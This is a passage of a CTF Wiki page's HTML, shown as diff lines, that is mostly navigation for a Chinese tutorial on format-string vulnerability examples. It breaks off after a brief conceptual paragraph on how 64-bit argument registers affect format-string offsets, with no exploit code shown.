+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../../reverse/unpack/last-exception/" title="最后一次异常法" class="md-nav__link">
+      最后一次异常法
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../../reverse/unpack/sfx/" title="SFX 法" class="md-nav__link">
+      SFX 法
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../../reverse/unpack/fix-iat/" title="DUMP 及 IAT 重建" class="md-nav__link">
+      DUMP 及 IAT 重建
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../../reverse/unpack/manually-fix-iat/" title="手动查找 IAT 并使用 ImportREC 重建" class="md-nav__link">
+      手动查找 IAT 并使用 ImportREC 重建
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../../reverse/unpack/unpack-dll/" title="DLL 文件脱壳" class="md-nav__link">
+      DLL 文件脱壳
+    </a>
+  </li>
+
+        
+      </ul>
+    </nav>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../../reverse/unicorn/introduction/" title="Unicorn Engine 简介" class="md-nav__link">
+      Unicorn Engine 简介
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item md-nav__item--nested">
+    
+      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-5-4" type="checkbox" id="nav-5-4">
+    
+    <label class="md-nav__link" for="nav-5-4">
+      反调试技术
+    </label>
+    <nav class="md-nav" data-md-component="collapsible" data-md-level="2">
+      <label class="md-nav__title" for="nav-5-4">
+        反调试技术
+      </label>
+      <ul class="md-nav__list" data-md-scrollfix>
+        
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../../reverse/anti-debug/ntglobalflag/" title="NtGlobalFlag" class="md-nav__link">
+      NtGlobalFlag
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../../reverse/anti-debug/heap-flags/" title="Heap Flags" class="md-nav__link">
+      Heap Flags
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../../reverse/anti-debug/the-heap/" title="The Heap" class="md-nav__link">
+      The Heap
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../../reverse/anti-debug/int-3/" title="Interrupt 3" class="md-nav__link">
+      Interrupt 3
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../../reverse/anti-debug/isdebuggerpresent/" title="IsDebuggerPresent" class="md-nav__link">
+      IsDebuggerPresent
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../../reverse/anti-debug/checkremotedebuggerpresent/" title="CheckRemoteDebuggerPresent" class="md-nav__link">
+      CheckRemoteDebuggerPresent
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../../reverse/anti-debug/ntqueryinformationprocess/" title="NtQueryInformationProcess" class="md-nav__link">
+      NtQueryInformationProcess
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../../reverse/anti-debug/junk-code/" title="花指令" class="md-nav__link">
+      花指令
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../../reverse/anti-debug/example/" title="反调试技术例题" class="md-nav__link">
+      反调试技术例题
+    </a>
+  </li>
+
+        
+      </ul>
+    </nav>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item md-nav__item--nested">
+    
+      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-5-5" type="checkbox" id="nav-5-5">
+    
+    <label class="md-nav__link" for="nav-5-5">
+      Linux 逆向技术
+    </label>
+    <nav class="md-nav" data-md-component="collapsible" data-md-level="2">
+      <label class="md-nav__title" for="nav-5-5">
+        Linux 逆向技术
+      </label>
+      <ul class="md-nav__list" data-md-scrollfix>
+        
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../../reverse/linux/ld_preload/" title="LD_PRELOAD" class="md-nav__link">
+      LD_PRELOAD
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../../reverse/linux/false-disasm/" title="False Disassembly" class="md-nav__link">
+      False Disassembly
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../../reverse/linux/detect-bp/" title="Detecting Breakpoints" class="md-nav__link">
+      Detecting Breakpoints
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../../reverse/linux/detect-dbg/" title="Detecting debugging" class="md-nav__link">
+      Detecting debugging
+    </a>
+  </li>
+
+        
+      </ul>
+    </nav>
+  </li>
+
+        
+      </ul>
+    </nav>
+  </li>
+
+    
+      
+      
+      
+
+  
+
+
+  <li class="md-nav__item md-nav__item--active md-nav__item--nested">
+    
+      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-6" type="checkbox" id="nav-6" checked>
+    
+    <label class="md-nav__link" for="nav-6">
+      Pwn
+    </label>
+    <nav class="md-nav" data-md-component="collapsible" data-md-level="1">
+      <label class="md-nav__title" for="nav-6">
+        Pwn
+      </label>
+      <ul class="md-nav__list" data-md-scrollfix>
+        
+        
+          
+          
+          
+
+
+  <li class="md-nav__item md-nav__item--nested">
+    
+      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-6-1" type="checkbox" id="nav-6-1">
+    
+    <label class="md-nav__link" for="nav-6-1">
+      StackOverflow 栈溢出
+    </label>
+    <nav class="md-nav" data-md-component="collapsible" data-md-level="2">
+      <label class="md-nav__title" for="nav-6-1">
+        StackOverflow 栈溢出
+      </label>
+      <ul class="md-nav__list" data-md-scrollfix>
+        
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../stackoverflow/stack_intro/" title="栈介绍" class="md-nav__link">
+      栈介绍
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../stackoverflow/stackoverflow_basic/" title="栈溢出原理" class="md-nav__link">
+      栈溢出原理
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../stackoverflow/basic_rop/" title="基本 ROP" class="md-nav__link">
+      基本 ROP
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../stackoverflow/others/" title="花式栈溢出技巧" class="md-nav__link">
+      花式栈溢出技巧
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../stackoverflow/medium_rop/" title="中级 ROP" class="md-nav__link">
+      中级 ROP
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../stackoverflow/advanced_rop/" title="高级 ROP" class="md-nav__link">
+      高级 ROP
+    </a>
+  </li>
+
+        
+      </ul>
+    </nav>
+  </li>
+
+        
+          
+          
+          
+
+  
+
+
+  <li class="md-nav__item md-nav__item--active md-nav__item--nested">
+    
+      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-6-2" type="checkbox" id="nav-6-2" checked>
+    
+    <label class="md-nav__link" for="nav-6-2">
+      格式化字符串
+    </label>
+    <nav class="md-nav" data-md-component="collapsible" data-md-level="2">
+      <label class="md-nav__title" for="nav-6-2">
+        格式化字符串
+      </label>
+      <ul class="md-nav__list" data-md-scrollfix>
+        
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../fmtstr_intro/" title="格式化字符串漏洞原理介绍" class="md-nav__link">
+      格式化字符串漏洞原理介绍
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../fmtstr_exploit/" title="格式化字符串漏洞利用" class="md-nav__link">
+      格式化字符串漏洞利用
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+  
+
+
+  <li class="md-nav__item md-nav__item--active">
+    
+    <input class="md-toggle md-nav__toggle" data-md-toggle="toc" type="checkbox" id="toc">
+    
+      
+    
+    
+      <label class="md-nav__link md-nav__link--active" for="toc">
+        格式化字符串漏洞例子
+      </label>
+    
+    <a href="./" title="格式化字符串漏洞例子" class="md-nav__link md-nav__link--active">
+      格式化字符串漏洞例子
+    </a>
+    
+      
+<nav class="md-nav md-nav--secondary">
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="toc">目录</label>
+    <ul class="md-nav__list" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#64" title="64位程序格式化字符串漏洞" class="md-nav__link">
+    64位程序格式化字符串漏洞
+  </a>
+  
+    <nav class="md-nav">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#_2" title="原理" class="md-nav__link">
+    原理
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_3" title="例子" class="md-nav__link">
+    例子
+  </a>
+  
+    <nav class="md-nav">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#_4" title="确定保护" class="md-nav__link">
+    确定保护
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_5" title="分析程序" class="md-nav__link">
+    分析程序
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_6" title="确定偏移" class="md-nav__link">
+    确定偏移
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_7" title="利用程序" class="md-nav__link">
+    利用程序
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#hijack-got" title="hijack GOT" class="md-nav__link">
+    hijack GOT
+  </a>
+  
+    <nav class="md-nav">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#_8" title="原理" class="md-nav__link">
+    原理
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_9" title="例子" class="md-nav__link">
+    例子
+  </a>
+  
+    <nav class="md-nav">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#_10" title="确定保护" class="md-nav__link">
+    确定保护
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_11" title="分析程序" class="md-nav__link">
+    分析程序
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_12" title="漏洞利用思路" class="md-nav__link">
+    漏洞利用思路
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_13" title="漏洞利用程序" class="md-nav__link">
+    漏洞利用程序
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#hijack-retaddr" title="hijack retaddr" class="md-nav__link">
+    hijack retaddr
+  </a>
+  
+    <nav class="md-nav">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#_14" title="原理" class="md-nav__link">
+    原理
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_15" title="例子" class="md-nav__link">
+    例子
+  </a>
+  
+    <nav class="md-nav">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#_16" title="确定保护" class="md-nav__link">
+    确定保护
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_17" title="分析程序" class="md-nav__link">
+    分析程序
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_18" title="利用思路" class="md-nav__link">
+    利用思路
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_19" title="确定偏移" class="md-nav__link">
+    确定偏移
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_20" title="修改地址" class="md-nav__link">
+    修改地址
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_21" title="利用程序" class="md-nav__link">
+    利用程序
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#_22" title="堆上的格式化字符串漏洞" class="md-nav__link">
+    堆上的格式化字符串漏洞
+  </a>
+  
+    <nav class="md-nav">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#_23" title="原理" class="md-nav__link">
+    原理
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_24" title="例子" class="md-nav__link">
+    例子
+  </a>
+  
+    <nav class="md-nav">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#_25" title="确定保护" class="md-nav__link">
+    确定保护
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_26" title="分析程序" class="md-nav__link">
+    分析程序
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_27" title="利用思路" class="md-nav__link">
+    利用思路
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_28" title="获取相关地址与偏移" class="md-nav__link">
+    获取相关地址与偏移
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_29" title="构造联系人获取堆地址" class="md-nav__link">
+    构造联系人获取堆地址
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#ebp" title="修改ebp" class="md-nav__link">
+    修改ebp
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#shell" title="获取shell" class="md-nav__link">
+    获取shell
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_30" title="利用程序" class="md-nav__link">
+    利用程序
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#_31" title="格式化字符串盲打" class="md-nav__link">
+    格式化字符串盲打
+  </a>
+  
+    <nav class="md-nav">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#_32" title="原理" class="md-nav__link">
+    原理
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#1-" title="例子1-泄露栈" class="md-nav__link">
+    例子1-泄露栈
+  </a>
+  
+    <nav class="md-nav">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#_33" title="确定程序位数" class="md-nav__link">
+    确定程序位数
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_34" title="利用" class="md-nav__link">
+    利用
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#2-got" title="例子2-盲打劫持got" class="md-nav__link">
+    例子2-盲打劫持got
+  </a>
+  
+    <nav class="md-nav">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#_35" title="确定程序位数" class="md-nav__link">
+    确定程序位数
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_36" title="确定偏移" class="md-nav__link">
+    确定偏移
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#binary" title="泄露binary" class="md-nav__link">
+    泄露binary
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#binary_1" title="分析binary" class="md-nav__link">
+    分析binary
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_37" title="利用思路" class="md-nav__link">
+    利用思路
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_38" title="利用程序" class="md-nav__link">
+    利用程序
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+      
+      
+      
+      
+    </ul>
+  
+</nav>
+    
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../fmtstr_detect/" title="格式化字符串漏洞检测" class="md-nav__link">
+      格式化字符串漏洞检测
+    </a>
+  </li>
+
+        
+      </ul>
+    </nav>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item md-nav__item--nested">
+    
+      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-6-3" type="checkbox" id="nav-6-3">
+    
+    <label class="md-nav__link" for="nav-6-3">
+      堆利用
+    </label>
+    <nav class="md-nav" data-md-component="collapsible" data-md-level="2">
+      <label class="md-nav__title" for="nav-6-3">
+        堆利用
+      </label>
+      <ul class="md-nav__list" data-md-scrollfix>
+        
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../heap/heap_overview/" title="堆概述" class="md-nav__link">
+      堆概述
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../heap/heap_structure/" title="堆相关数据结构" class="md-nav__link">
+      堆相关数据结构
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../heap/heap_implementation_details/" title="深入理解堆的实现" class="md-nav__link">
+      深入理解堆的实现
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../heap/heapoverflow_basic/" title="堆溢出" class="md-nav__link">
+      堆溢出
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../heap/off_by_one/" title="堆中的 Off-By-One" class="md-nav__link">
+      堆中的 Off-By-One
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../heap/unlink/" title="Unlink" class="md-nav__link">
+      Unlink
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../heap/use_after_free/" title="Use After Free" class="md-nav__link">
+      Use After Free
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../heap/fastbin_attack/" title="Fastbin Attack" class="md-nav__link">
+      Fastbin Attack
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../heap/chunk_extend_shrink/" title="Chunk Extend / Shrink" class="md-nav__link">
+      Chunk Extend / Shrink
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../heap/house_of_einherjar/" title="House Of Einherjar" class="md-nav__link">
+      House Of Einherjar
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../heap/house_of_lore/" title="House of Lore" class="md-nav__link">
+      House of Lore
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../heap/house_of_force/" title="House Of Force" class="md-nav__link">
+      House Of Force
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../heap/unsorted_bin_attack/" title="Unsorted Bin Attack" class="md-nav__link">
+      Unsorted Bin Attack
+    </a>
+  </li>
+
+        
+      </ul>
+    </nav>
+  </li>
+
+        
+      </ul>
+    </nav>
+  </li>
+
+    
+      
+      
+      
+
+
+  <li class="md-nav__item md-nav__item--nested">
+    
+      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-7" type="checkbox" id="nav-7">
+    
+    <label class="md-nav__link" for="nav-7">
+      Executable
+    </label>
+    <nav class="md-nav" data-md-component="collapsible" data-md-level="1">
+      <label class="md-nav__title" for="nav-7">
+        Executable
+      </label>
+      <ul class="md-nav__list" data-md-scrollfix>
+        
+        
+          
+          
+          
+
+
+  <li class="md-nav__item md-nav__item--nested">
+    
+      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-7-1" type="checkbox" id="nav-7-1">
+    
+    <label class="md-nav__link" for="nav-7-1">
+      ELF 文件
+    </label>
+    <nav class="md-nav" data-md-component="collapsible" data-md-level="2">
+      <label class="md-nav__title" for="nav-7-1">
+        ELF 文件
+      </label>
+      <ul class="md-nav__list" data-md-scrollfix>
+        
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../../executable/elf/elf_structure/" title="ELF文件基本结构" class="md-nav__link">
+      ELF文件基本结构
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../../executable/elf/program_loading/" title="程序加载" class="md-nav__link">
+      程序加载
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../../executable/elf/program_linking/" title="程序链接" class="md-nav__link">
+      程序链接
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../../executable/elf/running_overview/" title="程序执行流程" class="md-nav__link">
+      程序执行流程
+    </a>
+  </li>
+
+        
+      </ul>
+    </nav>
+  </li>
+
+        
+      </ul>
+    </nav>
+  </li>
+
+    
+  </ul>
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+            
+              <div class="md-sidebar md-sidebar--secondary" data-md-component="toc">
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+<nav class="md-nav md-nav--secondary">
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="toc">目录</label>
+    <ul class="md-nav__list" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#64" title="64位程序格式化字符串漏洞" class="md-nav__link">
+    64位程序格式化字符串漏洞
+  </a>
+  
+    <nav class="md-nav">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#_2" title="原理" class="md-nav__link">
+    原理
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_3" title="例子" class="md-nav__link">
+    例子
+  </a>
+  
+    <nav class="md-nav">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#_4" title="确定保护" class="md-nav__link">
+    确定保护
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_5" title="分析程序" class="md-nav__link">
+    分析程序
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_6" title="确定偏移" class="md-nav__link">
+    确定偏移
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_7" title="利用程序" class="md-nav__link">
+    利用程序
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#hijack-got" title="hijack GOT" class="md-nav__link">
+    hijack GOT
+  </a>
+  
+    <nav class="md-nav">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#_8" title="原理" class="md-nav__link">
+    原理
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_9" title="例子" class="md-nav__link">
+    例子
+  </a>
+  
+    <nav class="md-nav">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#_10" title="确定保护" class="md-nav__link">
+    确定保护
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_11" title="分析程序" class="md-nav__link">
+    分析程序
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_12" title="漏洞利用思路" class="md-nav__link">
+    漏洞利用思路
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_13" title="漏洞利用程序" class="md-nav__link">
+    漏洞利用程序
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#hijack-retaddr" title="hijack retaddr" class="md-nav__link">
+    hijack retaddr
+  </a>
+  
+    <nav class="md-nav">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#_14" title="原理" class="md-nav__link">
+    原理
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_15" title="例子" class="md-nav__link">
+    例子
+  </a>
+  
+    <nav class="md-nav">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#_16" title="确定保护" class="md-nav__link">
+    确定保护
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_17" title="分析程序" class="md-nav__link">
+    分析程序
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_18" title="利用思路" class="md-nav__link">
+    利用思路
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_19" title="确定偏移" class="md-nav__link">
+    确定偏移
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_20" title="修改地址" class="md-nav__link">
+    修改地址
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_21" title="利用程序" class="md-nav__link">
+    利用程序
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#_22" title="堆上的格式化字符串漏洞" class="md-nav__link">
+    堆上的格式化字符串漏洞
+  </a>
+  
+    <nav class="md-nav">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#_23" title="原理" class="md-nav__link">
+    原理
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_24" title="例子" class="md-nav__link">
+    例子
+  </a>
+  
+    <nav class="md-nav">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#_25" title="确定保护" class="md-nav__link">
+    确定保护
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_26" title="分析程序" class="md-nav__link">
+    分析程序
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_27" title="利用思路" class="md-nav__link">
+    利用思路
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_28" title="获取相关地址与偏移" class="md-nav__link">
+    获取相关地址与偏移
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_29" title="构造联系人获取堆地址" class="md-nav__link">
+    构造联系人获取堆地址
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#ebp" title="修改ebp" class="md-nav__link">
+    修改ebp
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#shell" title="获取shell" class="md-nav__link">
+    获取shell
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_30" title="利用程序" class="md-nav__link">
+    利用程序
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#_31" title="格式化字符串盲打" class="md-nav__link">
+    格式化字符串盲打
+  </a>
+  
+    <nav class="md-nav">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#_32" title="原理" class="md-nav__link">
+    原理
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#1-" title="例子1-泄露栈" class="md-nav__link">
+    例子1-泄露栈
+  </a>
+  
+    <nav class="md-nav">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#_33" title="确定程序位数" class="md-nav__link">
+    确定程序位数
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_34" title="利用" class="md-nav__link">
+    利用
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#2-got" title="例子2-盲打劫持got" class="md-nav__link">
+    例子2-盲打劫持got
+  </a>
+  
+    <nav class="md-nav">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#_35" title="确定程序位数" class="md-nav__link">
+    确定程序位数
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_36" title="确定偏移" class="md-nav__link">
+    确定偏移
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#binary" title="泄露binary" class="md-nav__link">
+    泄露binary
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#binary_1" title="分析binary" class="md-nav__link">
+    分析binary
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_37" title="利用思路" class="md-nav__link">
+    利用思路
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_38" title="利用程序" class="md-nav__link">
+    利用程序
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+      
+      
+      
+      
+    </ul>
+  
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+          
+          <div class="md-content">
+            <article class="md-content__inner md-typeset">
+              
+                
+                  <a href="https://github.com/ctf-wiki/ctf-wiki/blob/master/docs/pwn/fmtstr/fmtstr_example.md" title="编辑此页" class="md-icon md-content__icon">&#xE3C9;</a>
+                
+                
+                <h1 id="_1">格式化字符串漏洞例子<a class="headerlink" href="#_1" title="Permanent link">&para;</a></h1>
+<p>下面会介绍一些CTF中的格式化漏洞的题目。也都是格式化字符串常见的利用。</p>
+<h2 id="64">64位程序格式化字符串漏洞<a class="headerlink" href="#64" title="Permanent link">&para;</a></h2>
+<h3 id="_2">原理<a class="headerlink" href="#_2" title="Permanent link">&para;</a></h3>
+<p>其实64位的偏移计算和32位类似，都是算对应的参数。只不过64位函数的前6个参数是存储在相应的寄存器中的。那么在格式化字符串漏洞中呢？虽然我们并没有向相应寄存器中放入数据，但是程序依旧会按照格式化字符串的相应格式对其进行解析。</p>
+<h3 id="_3">例子<a class="headerlink" href="#_3" title="Permanent link">&para;</a></h3>
